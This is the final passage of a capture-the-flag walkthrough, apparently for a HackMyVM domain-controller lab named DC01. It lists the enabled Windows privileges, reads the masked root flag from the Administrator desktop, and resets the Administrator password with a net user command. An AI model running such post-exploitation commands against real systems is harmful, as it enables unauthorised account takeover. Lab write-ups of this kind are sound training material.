SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

`hostname`:
```
DC01 ←
```

`cd C:\Users\Administrator\Desktop`

`dir`:
```
    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2024   1:01 PM             33 root.txt ←
```

`type ./root.txt`:
```
d41d8*************************** ←
```

`net user Administrator H4ck3d!`:
```
The command completed successfully. ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
